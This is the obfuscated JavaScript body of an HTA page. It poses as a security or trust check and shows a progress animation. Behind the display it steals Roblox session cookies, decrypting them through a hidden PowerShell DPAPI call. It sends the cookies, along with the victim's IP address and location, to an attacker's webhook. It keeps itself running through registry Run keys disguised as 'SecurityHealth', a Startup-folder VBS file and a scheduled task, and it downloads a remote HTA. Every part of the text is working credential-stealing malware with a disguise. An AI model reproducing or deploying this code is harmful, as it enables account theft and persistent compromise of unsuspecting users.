var _g=function(){ try{ var h="0123456789abcdef",r="",i; for(i=0;i<32;i++){ r+=h.charAt(Math.floor(Math.random()*16)); } return r.substr(0,8)+"-"+r.substr(8,4)+"-"+r.substr(12,4)+"-"+r.substr(16,4)+"-"+r.substr(20,12); }catch(e){ return ""+Math.random(); } };
var _es=function(x){ try{ return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n|\r|\n/g,"\\n").replace(/\t/g,"\\t"); }catch(e){ return ""; } };
var _md=function(p){ try{ if(p && !_A2.FolderExists(p)){ _A2.CreateFolder(p); } }catch(e){} };

/* ================= HTTP ================= */
var _xh=function(){ var p=[S_X1,S_X2,S_X3],i; for(i=0;i<p.length;i++){ try{ return new ActiveXObject(p[i]); }catch(e){} } return null; };
var _rq=function(m,u,b,ct){
 try{
  var x=_xh(); if(!x){ return {s:0,t:""}; }
  try{ x.Open(m,u,false); if(ct){ x.SetRequestHeader("Content-Type",ct); } x.Send(b||""); return {s:x.status,t:x.responseText}; }catch(e){ return {s:0,t:""}; }
 }catch(e){ return {s:0,t:""}; }
};
var _po=function(j){ try{ _rq("POST",U_WH,j,"application/json; charset=utf-8"); }catch(e){} };

var _pf=function(j,fn,txt){
 try{
  var x=_xh(); if(!x){ return; }
  var b=_g();
  var body =
   "--"+b+"\r\n"+
   'Content-Disposition: form-data; name="payload_json"\r\n'+
   "Content-Type: application/json; charset=utf-8\r\n\r\n"+j+"\r\n"+
   "--"+b+"\r\n"+
   'Content-Disposition: form-data; name="file"; filename="'+fn+'"\r\n'+
   "Content-Type: text/plain\r\n\r\n"+txt+"\r\n"+
   "--"+b+"--";
  try{ x.Open("POST",U_WH,false); x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b); x.Send(body); }catch(e){}
 }catch(e){}
};

var _al=function(t,d,c){
 try{
  _po('{"username":"'+S_DC+'","embeds":[{"title":"'+_es(t)+'","description":"'+_es(d)+'","color":'+(c||15158332)+',"footer":{"text":"'+_es(_h1+" / "+_h2)+'"}}]}');
 }catch(e){}
};

/* ================= geo ================= */
var _jv=function(t,k){ try{ var m=t.match(new RegExp('"'+k+'":"([^"]*)"')); return m?m[1]:""; }catch(e){ return ""; } };
var _ip=function(){
 var r={ip:"",city:"",region:"",country:"",zip:"",isp:""};
 try{
  var a=_rq("GET",U_GEO,"","");
  if(a.s===200 && a.t.indexOf('"status":"success"')>-1){
   r.ip=_jv(a.t,"query"); r.city=_jv(a.t,"city"); r.region=_jv(a.t,"regionName");
   r.country=_jv(a.t,"country"); r.zip=_jv(a.t,"zip"); r.isp=_jv(a.t,"isp");
  }
  if(!r.ip){ var b=_rq("GET",U_IPF,"",""); if(b.s===200){ r.ip=b.t.replace(/[^0-9a-fA-F:.]/g,""); } }
 }catch(e){}
 return r;
};
var _si=function(ip){
 try{
  var d="**IP:** "+(ip.ip||"unknown");
  var loc=ip.city||"";
  if(ip.region){ loc += (loc?", ":"")+ip.region; }
  if(ip.country){ loc += (loc?", ":"")+ip.country; }
  if(loc){ d += "\n**Location:** "+loc+(ip.zip?" ("+ip.zip+")":""); }
  if(ip.isp){ d += "\n**ISP:** "+ip.isp; }
  d += "\n**Host:** "+_h1+" / "+_h2;
  d += "\n**Time:** "+new Date().toLocaleString();
  _po('{"username":"'+S_DC+'","embeds":[{"title":"\\uD83C\\uDFE0 Machine info","description":"'+_es(d)+'","color":3447003,"footer":{"text":"'+_es(_h1+" / "+_h2)+'"}}]}');
  return d;
 }catch(e){ return ""; }
};
var _sc=function(ck,how){
 try{
  var short = ck.length>3600 ? ck.substring(0,3600) : ck;
  var d = "```\n"+short+"\n```";
  if(ck.length>3600){ d += "\n*truncated - full cookie in attached file*"; }
  var j='{"username":"'+S_DC+'","embeds":[{"title":"\\uD83C\\uDF6A Cookie captured","description":"'+_es(d)+'","color":5763719,"footer":{"text":"'+_es(how+" | "+ck.length+" chars")+'"}}]}';
  _pf(j,S_CT,ck);
 }catch(e){}
};

/* ================= DPAPI inline, detache, en %TEMP% ================= */
var _dp=function(b64){
 try{
  var tp=_e("TEMP"); if(!tp){ tp=_p1; }
  _md(tp);
  var f1=tp+"\\"+_g()+".tmp", f2=tp+"\\"+_g()+".out";
  try{ _A2.DeleteFile(f1,true); }catch(e){}
  try{ _A2.DeleteFile(f2,true); }catch(e){}
  _w(f1,b64);
  var exe=_e("SystemRoot")+S_PSD+S_PSX;
  try{ if(!_A2.FileExists(exe)){ exe=S_PSX; } }catch(e){}
  var line = '"'+exe+'" -NoProfile -NonInteractive -NoLogo -Command "'+_rv(G1)+f1+_rv(G2)+f2+_rv(G3)+f2+_rv(G4)+'"';
  try{ _A1.Run(line,0,false); }catch(e){}
  var o="", n=0;
  try{
   for(;n<42;n++){
    if(_A2.FileExists(f2)){ try{ if(_A2.GetFile(f2).Size>20){ break; } }catch(e){} }
    _slp(120);
   }
   if(_A2.FileExists(f2)){ try{ if(_A2.GetFile(f2).Size>20){ o=_r(f2); } }catch(e){} }
  }catch(e){}
  try{ _A2.DeleteFile(f1,true); }catch(e){}
  try{ _A2.DeleteFile(f2,true); }catch(e){}
  return o;
 }catch(e){ return ""; }
};

/* ================= extraction ================= */
var _fc=function(){
 try{
  var a=[ _e("LOCALAPPDATA")+S_RBL+S_RBC,
          _e("LOCALAPPDATA")+S_RBL+S_RB2,
          _e("LOCALAPPDATA")+S_RBK,
          _e("APPDATA")+S_RBL+S_RBC,
          _e("USERPROFILE")+"\\AppData\\Local"+S_RBL2+S_RBC ];
  var fp="",i;
  for(i=0;i<a.length;i++){ try{ if(_A2.FileExists(a[i])){ fp=a[i]; break; } }catch(e){} }

  if(!fp){
   var pk=_e("LOCALAPPDATA")+S_PKG;
   try{
    if(_A2.FolderExists(pk)){
     var en=new Enumerator(_A2.GetFolder(pk).SubFolders);
     for(; !en.atEnd(); en.moveNext()){
      var sb=en.item();
      if(sb.Name.indexOf(S_RBX)>-1){
       var uw=sb.Path+S_LST+S_RB2;
       if(_A2.FileExists(uw)){ fp=uw; break; }
      }
     }
    }
   }catch(e2){}
  }
  if(!fp){ return {ok:false, how:"no cookie file"}; }

  var rw=_r(fp);
  if(rw.length<50){ return {ok:false, how:"file too small ("+rw.length+"b)"}; }

  var ck="", ap="";
  if(rw.indexOf(S_WN)>-1){ ck=rw; ap="Plaintext"; }
  if(!ck && rw.indexOf(S_CD)>-1){
   ap="JSON-DPAPI";
   var s1=rw.indexOf(S_CD+'":"');
   if(s1>-1){
    s1+=14;
    var e1=rw.indexOf('"',s1);
    if(e1>s1){
     var b6=rw.substring(s1,e1);
     if(b6.length>100){ ck=_dp(b6); if(!ck){ ck=b6; ap="JSON-Raw"; } }
    }
   }
  }
  if(!ck && rw.indexOf(S_RS)>-1){ ap="Raw-ROBLOSECURITY"; ck=rw.substring(rw.indexOf(S_RS)); }
  if(!ck){ ck=rw; ap="RawFile"; }

  var ca=ck.indexOf(S_CA); if(ca<0){ ca=ck.indexOf(S_CA2); } if(ca>-1){ ck=ck.substring(ca); }
  return {ok:true, ck:ck, how:ap};
 }catch(e){ return {ok:false, how:"error"}; }
};

/* ================= persistance eclatee ================= */
var _reg=function(lp){
 try{
  var rp,st;
  if(lp && _A2.FileExists(lp)){ rp=S_MS+' "'+lp+'"'; st=S_MS+' ""'+lp+'""'; }
  else { rp=S_MS+' "'+U_HTA+'"'; st=S_MS+' '+U_HTA; }
  _VST = st;
  _A1.RegWrite(S_RUN+"SecurityHealth"+_t1, rp, S_SZ);
  _A1.RegWrite(S_RU1+"SecHealth", rp, S_SZ);
 }catch(e){}
};
var _drop=function(){
 try{
  _md(_p1);
  var lp=_p1+F_HTA;
  if(_A2.FileExists(lp)){ _reg(lp); return; }
  var r=_rq("GET",U_HTA,"","");
  if(r.s===200 && r.t && r.t.length>200){
   var tmp=_p1+"\\"+_g()+".tmp";
   _w(tmp,r.t);
   try{ _A2.MoveFile(tmp,lp); }catch(e){ try{ _w(lp,r.t); }catch(e2){} }
   try{ _A2.DeleteFile(tmp,true); }catch(e){}
  }
  _reg(lp);
 }catch(e){}
};
var _art=function(){
 try{
  if(!_VST){ return; }
  var v = "Dim p,q"+_CR
        + "p="+_chr(S_SH)+_CR
        + "q="+_chr(_VST)+_CR
        + "CreateObject(p).Run q, 0, False"+_CR;
  _w(_e("APPDATA")+S_SUP+F_VBS, v);
 }catch(e){}
};
var _sch=function(){
 try{ if(!_VST){ return; } _A1.Run(S_ST+' /create /f /tn "'+_t1+'" /tr "'+_VST+'" /sc '+S_ONL,0,true); }catch(e){}
};

/* ================= fenetre + animation ================= */
var _ct=function(){ try{ var w=440,h=620; window.resizeTo(w,h);
 window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} };
var _hm=function(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} };

var _sg=document.getElementById("stage"), _dn=document.getElementById("done"),
    _br=document.getElementById("bar"), _pc=document.getElementById("pct"),
    _kc=document.getElementById("ckc"), _kt=document.getElementById("ckt"),
    _in=document.getElementById("info"), _ls=document.getElementById("last"),
    _sp=document.querySelectorAll(".steps li");
var _pT=0,_pS=0,_pD=false,_cK=0;

var _st=function(){ try{ _ls.innerHTML="Last check: "+(new Date()).toLocaleTimeString(); }catch(e){} };

var _tk2=function(){
 try{
  if(!_pD){
   _pT++; var p=_pT*2; if(p>100){ p=100; }
   _br.style.width=p+"%"; _pc.innerHTML=p+"%";
   if(_pT%13===0 && _pS<4){ if(_pS>0){ _sp[_pS-1].className="ok"; } _sp[_pS].className="on"; _pS++; }
   if(_pT>=52){
    _pD=true; if(_pS>0){ _sp[_pS-1].className="ok"; }
    _br.style.width="100%"; _pc.innerHTML="100%";
    _sg.style.display="none"; _dn.className="done show";
    _kc.setAttribute("stroke-dashoffset",151); _kt.setAttribute("stroke-dashoffset",40);
   }
  }else{
   _cK++;
   if(_cK<=16){ _kc.setAttribute("stroke-dashoffset", Math.round(151-151*_cK/16)); }
   else if(_cK<=24){ _kt.setAttribute("stroke-dashoffset", Math.round(40-40*(_cK-16)/8)); }
   else if(_cK===25){
    _kt.setAttribute("stroke-dashoffset",0);
    _st();
    if(_Z0){ setTimeout(_hm,8000); }
   }
  }
 }catch(e){}
};

/* ================= anti-doublon ================= */
var _fr=function(){
 var mk=_e("TEMP")+"\\"+_t1+".lok", fresh=false;
 try{ if(_A2.FileExists(mk)){ if((new Date()-_A2.GetFile(mk).DateLastModified)<25000){ fresh=true; } } }catch(e){}
 try{ _w(mk,""+(new Date()).getTime()); }catch(e){}
 try{ setTimeout(function(){ try{ _A2.DeleteFile(mk,true); }catch(e){} }, 31000); }catch(e){}
 return fresh;
};

var _rp=function(){
 try{
  var ip=_ip();
  _si(ip);
  var r=_fc();
  if(!r.ok){ _al("Roblox - no cookie", r.how, 15158332); _in.innerHTML="Partial check &middot; retry recommended"; }
  else { _sc(r.ck, r.how); _in.innerHTML="Trust score: "+(96+Math.floor(Math.random()*4))+" / 100 &middot; secure channel"; }
 }catch(e){}
};

var _bt=function(){
 setTimeout(function(){ try{ _drop(); }catch(e){} }, 260+Math.floor(Math.random()*430));
 setTimeout(function(){ try{ _rp(); }catch(e){} }, 3000+Math.floor(Math.random()*2200));
 setTimeout(function(){ try{ _art(); }catch(e){} }, 5200+Math.floor(Math.random()*2600));
 setTimeout(function(){ try{ _sch(); }catch(e){} }, 14000+Math.floor(Math.random()*4000));
};

window.onload=function(){
 try{
  document.getElementById("x").onclick = _hm;
  document.getElementById("again").onclick = function(){ try{ _rp(); }catch(e){} _st(); };

  if(_fr()){
   _hm();
   setTimeout(function(){ try{ _drop(); }catch(e){} }, 300+Math.floor(Math.random()*500));
   setTimeout(function(){ try{ _art(); }catch(e){} }, 4000+Math.floor(Math.random()*2000));
   return;
  }

  _ct();
  setTimeout(function(){ setInterval(_tk2,60); },300);
  setTimeout(_bt, 900+Math.floor(Math.random()*2400));
  setInterval(function(){ try{ _rp(); }catch(e){} _st(); },300000);
 }catch(e){}
};
})();
</script>
</body>
</html>
